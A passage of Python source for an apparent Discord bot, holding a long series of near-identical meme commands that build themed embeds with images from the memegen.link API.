        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Futurama Fry""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/fry/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="fwp <Text 1> <Text 2>", description="First World Problems meme")
    async def fwp(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""First World Problems""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/fwp/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="gandalf <Text 1> <Text 2>", description="Confused Gandalf")
    async def gandalf(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Confused Gandalf""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/gandalf/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="gb <Text 1> <Text 2>", description="Galaxy Brain")
    async def gb(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Galaxy Brain""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/gb/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="gears <Text 1> <Text 2>", description="You Know What Really Grinds My Gears?")
    async def gears(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""You Know What Really Grinds My Gears?""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/gears/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="ggg <Text 1> <Text 2>", description="Good Guy Greg")
    async def ggg(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Good Guy Greg""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/ggg/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="gru <Text 1> <Text 2>", description="Gru's Plan")
    async def gru(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Gru's Plan""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/gru/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="grumpycat <Text 1> <Text 2>", description="Grumpy Cat")
    async def grumpycat(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Grumpy Cat""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/grumpycat/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="hagrid <Text 1> <Text 2>", description="I Should Not Have Said That")
    async def hagrid(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""I Should Not Have Said That""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/hagrid/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="happening <Text 1> <Text 2>", description="It's Happening")
    async def happening(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""It's Happening""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/happening/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="harold <Text 1> <Text 2>", description="Hide the Pain Harold")
    async def harold(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Hide the Pain Harold""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/harold/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="hipster <Text 1> <Text 2>", description="Hipster Barista")
    async def hipster(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Hipster Barista""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/hipster/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="icanhas <Text 1> <Text 2>", description="I Can Has Cheezburger?")
    async def icanhas(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""I Can Has Cheezburger?""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/icanhas/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="imsorry <Text 1> <Text 2>", description="Oh, I'm Sorry, I Thought This Was America")
    async def imsorry(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Oh, I'm Sorry, I Thought This Was America""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/imsorry/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="inigo <Text 1> <Text 2>", description="Inigo Montoya")
    async def inigo(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Inigo Montoya""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/inigo/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="interesting <Text 1> <Text 2>", description="The Most Interesting Man in the World")
    async def interesting(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""The Most Interesting Man in the World""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/interesting/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="ive <Text 1> <Text 2>", description="Jony Ive Redesigns Things")
    async def ive(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Jony Ive Redesigns Things""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/ive/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="iw <Text 1> <Text 2>", description="Insanity Wolf")
    async def iw(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Insanity Wolf""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/iw/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="jd <Text 1> <Text 2>", description="Joseph Ducreux / Archaic Rap")
    async def jd(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Joseph Ducreux / Archaic Rap""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/jd/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="jetpack <Text 1> <Text 2>", description="Nothing To Do Here")
    async def jetpack(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Nothing To Do Here""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/jetpack/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="joker <Text 1> <Text 2>", description="It's Simple, Kill the Batman")
    async def joker(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""It's Simple, Kill the Batman""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/joker/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="jw <Text 1> <Text 2>", description="Probably Not a Good Idea")
    async def jw(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Probably Not a Good Idea""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/jw/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="keanu <Text 1> <Text 2>", description="Conspiracy Keanu")
    async def keanu(ctx, text1: str="", text2: str=""):
        embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f"""Conspiracy Keanu""",timestamp=embed_timestamp())
        embed.set_image(url=f"""https://api.memegen.link/images/keanu/{urllib.parse.quote(text1)}/{urllib.parse.quote(text2)}.png""")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
